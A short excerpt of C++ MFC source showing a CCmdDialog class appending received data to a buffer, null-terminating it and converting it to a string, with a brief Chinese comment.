...
void CCmdDialog::OnReceiveComplete()
{
	AddKeyBoardData();
...
void CCmdDialog::AddKeyBoardData()
{
	// 最后填上0
	m_Context->m_DeCompressionBuffer.Write((LPBYTE)"", 1);
	CString strResult(m_Context->m_DeCompressionBuffer.GetBuffer(0));
